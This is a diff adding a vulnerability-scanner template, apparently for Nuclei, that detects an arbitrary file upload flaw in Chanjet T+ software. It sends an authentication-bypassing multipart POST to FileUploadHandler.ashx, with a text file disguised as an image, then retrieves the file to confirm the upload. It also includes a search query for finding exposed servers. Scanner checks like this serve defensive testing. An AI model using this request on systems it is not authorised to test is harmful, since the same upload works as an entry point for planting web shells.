@@ -1,0 +1,45 @@
+id: chanjet-tplus-FileUploadHandler-fileupload
+
+info:
+  name: UFIDA Chanjet TPluse FileUploadHandler.aspx - Arbitrary File Upload
+  author: xc
+  severity: high
+  description: |
+    chanjet-tplus-FileUploadHandler-fileupload.
+  metadata:
+    fofa-query: app="畅捷通-TPlus"
+  tags: chanjet-tplus-FileUploadHandler-fileupload
+  
+
+  
+requests:
+  - raw:
+      - |-
+        POST /tplus/SM/SetupAccount/FileUploadHandler.ashx/;/login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 180
+        Content-Type: multipart/form-data; boundary=f95ec6be8c3acff8e3edd3d910d3b9a6
+
+        --f95ec6be8c3acff8e3edd3d910d3b9a6
+        Content-Disposition: form-data; name="file"; filename="test000.txt"
+        Content-Type: image/jpeg
+
+        123000
+        --f95ec6be8c3acff8e3edd3d910d3b9a6--
+
+        
+      - |+
+        GET /tplus/UserFiles/test000.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'contains((body_2), "123000") && status_code_2 == 200' 
